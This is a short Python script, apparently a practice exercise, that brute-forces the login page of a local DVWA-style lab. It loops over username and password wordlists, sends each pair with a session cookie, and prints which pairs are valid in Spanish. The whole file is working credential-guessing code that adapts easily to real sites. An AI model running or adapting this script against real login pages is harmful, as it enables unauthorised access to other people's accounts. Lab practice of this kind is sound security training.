
import sys
import requests
from termcolor import colored, cprint
cookie = {"PHPSESSID": "6aa3bd2a5289f2ec1e6fbd394f63542e",
          "security":"low"}

def file_read(file):
       with open(file,mode='r',encoding='utf-8') as file_text:
              return file_text.read()
    
user = file_read("users.txt").split("\n")
password = file_read("passwords.txt").split("\n")
 

for i in user:
    for j in password:
        url = f"http://127.0.0.1:8081/vulnerabilities/brute/?username={i}&password={j}&Login=Login#"
        response = requests.get(url,cookies=cookie)

        if not "Username and/or password incorrect." in response.text:
              cprint(f"[+] {i}:{j} es valido", "green", attrs=["bold"], file=sys.stderr)
        else:
              cprint(f"[-] {i}:{j} no es valido", "red", attrs=["bold"], file=sys.stderr)
